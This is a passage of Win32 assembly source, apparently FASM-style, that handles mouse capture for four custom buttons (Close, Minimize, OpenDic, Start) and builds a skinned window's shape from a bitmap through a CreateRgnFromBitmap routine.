				mov eax,[btn4mouse]
			.endif
			.if eax<>0
				invoke ReleaseCapture
				invoke SendMessageA,[hwnd],BM_SETIMAGE,IMAGE_BITMAP,0
			.endif
		.else
			mov eax,[hwnd]
			.if eax=[hClose]
				mov eax,[btn1mouse]
			.elseif eax=[hMinimize]
				mov eax,[btn2mouse]
			.elseif eax=[hOpenDic]
				mov eax,[btn3mouse]
			.elseif eax=[hStart]
				mov eax,[btn4mouse]
			.endif
			.if eax=0
				invoke SetCapture,[hwnd]
				mov eax,[hwnd]
				.if eax=[hClose]
					mov [btn1mouse],1
				.elseif eax=[hMinimize]
					mov [btn2mouse],1
				.elseif eax=[hOpenDic]
					mov [btn3mouse],1
				.elseif eax=[hStart]
					mov [btn4mouse],1
				.endif
				invoke SendMessageA,[hwnd],BM_SETIMAGE,IMAGE_BITMAP,0
			.endif
		.endif
		jmp .finish
	.elseif [msg]=WM_CAPTURECHANGED
		mov eax,[hwnd]
		.if eax=[hClose]
			mov [btn1mouse],0
		.elseif eax=[hMinimize]
			mov [btn2mouse],0
		.elseif eax=[hOpenDic]
			mov [btn3mouse],0
		.elseif eax=[hStart]
			mov [btn4mouse],0
		.endif
	.elseif [msg]=WM_PRINTCLIENT
		invoke GetDC,[hwnd]
		mov edi,eax
		invoke BitBlt,[wparam],0,0,600,300,edi,0,0,SRCCOPY
		invoke ReleaseDC,[hwnd],esi
		jmp .finish
	.endif
	invoke CallWindowProc,[oldwprocbutton],[hwnd],[msg],[wparam],[lparam]
	ret
     .finish:
	xor eax,eax
	ret
endp

proc CreateRgnFromBitmap bmp,Color
	local x:DWORD
	local y:DWORD
	local Rgn:DWORD
	local BMP:BITMAP
	local hDC:DWORD
	local BInfo:BITMAPINFO
	local buff:DWORD
	local region_data:DWORD

	mov [Rgn],0
	xor edi,edi
	invoke CreateCompatibleDC,edi
	cmp eax,edi
	je .exit
	mov [hDC],eax
	lea eax,[BMP]
	invoke GetObjectA,[bmp],sizeof.BITMAP,eax
	test eax,eax
	je .exit
	mov eax,[BMP.bmWidth]
	mov ebx,[BMP.bmHeight]
	mul ebx
	shl eax,2 ; eax*4
	invoke GlobalAlloc,GPTR,eax;240*4*300
	test eax,eax
	je .exit
	mov [buff],eax
	mov eax,[BMP.bmWidth]
	mov ebx,[BMP.bmHeight]
	mul ebx
	mov ebx,sizeof.RECT
	mul ebx
	add eax,sizeof.RGNDATA
	invoke GlobalAlloc,GPTR,eax
	test eax,eax
	je .exit
	mov [region_data],eax
	lea eax,[BInfo]
	invoke RtlZeroMemory,eax,sizeof.BITMAPINFO
	mov [BInfo.bmiHeader.biSize],sizeof.BITMAPINFOHEADER
	mov eax,[BMP.bmWidth]
	mov [BInfo.bmiHeader.biWidth],eax
	mov eax,[BMP.bmHeight]
	mov [BInfo.bmiHeader.biHeight],eax
	mov ax,[BMP.bmPlanes]
	mov [BInfo.bmiHeader.biPlanes],ax
	mov [BInfo.bmiHeader.biBitCount],32
	lea eax,[BInfo]
	invoke GetDIBits,[hDC],[bmp],edi,[BInfo.bmiHeader.biHeight],[buff],eax,DIB_RGB_COLORS
	mov [y],edi
	mov eax,[region_data]
	mov dword [eax+RGNDATA.rdh.dwSize],sizeof.RGNDATAHEADER
	mov dword [eax+RGNDATA.rdh.iType],RDH_RECTANGLES
	mov dword [eax+RGNDATA.rdh.nCount],edi
	mov dword [eax+RGNDATA.rdh.rcBound.left],edi
	mov dword [eax+RGNDATA.rdh.rcBound.top],edi
	mov dword [eax+RGNDATA.rdh.rcBound.right],edi
	mov dword [eax+RGNDATA.rdh.rcBound.bottom],edi
	mov ecx,[BMP.bmHeight]
       .m1:
	mov [x],edi
	push ecx
	mov ecx,[BMP.bmWidth]
      .m2:
	push ecx
	mov ecx,[x]
	shl ecx,2
	add ecx,[buff]
	mov eax,[BMP.bmWidth];240*4
	shl eax,2 ; eax*4
	mov ebx,[BMP.bmHeight]
	sub ebx,[y]
	dec ebx
	mul ebx
	add ecx,eax
	mov eax,[Color]
	.if eax<>dword [ecx]
		mov edx,[region_data]
		mov eax,dword [edx+RGNDATA.rdh.nCount]
		shl eax,sizeof.RECT/4
		lea ecx,[edx+RGNDATA.buffer]
		mov ebx,[x]
		mov [ecx+eax+RECT.left],ebx
		mov ebx,[y]
		mov [ecx+eax+RECT.top],ebx
		mov ebx,[x]
		inc ebx
		mov [ecx+eax+RECT.right],ebx
		mov ebx,[y]
		inc ebx
		mov [ecx+eax+RECT.bottom],ebx
		inc dword [edx+RGNDATA.rdh.nCount]
	.endif
	inc [x]
	pop ecx
	loop .m2
	inc [y]
	pop ecx
	loop .m1
	mov ebx,[region_data]
	mov eax,dword [ebx+RGNDATA.rdh.nCount]
	shl eax,sizeof.RECT/4
	mov dword [ebx+RGNDATA.rdh.nRgnSize],eax
	add eax,sizeof.RGNDATA
	invoke ExtCreateRegion,edi,eax,ebx
	mov [Rgn],eax
	invoke DeleteDC,[hDC]
	invoke GlobalFree,[buff]
	invoke GlobalFree,[region_data]
     .exit:
	mov eax,[Rgn]
	ret
endp
.end start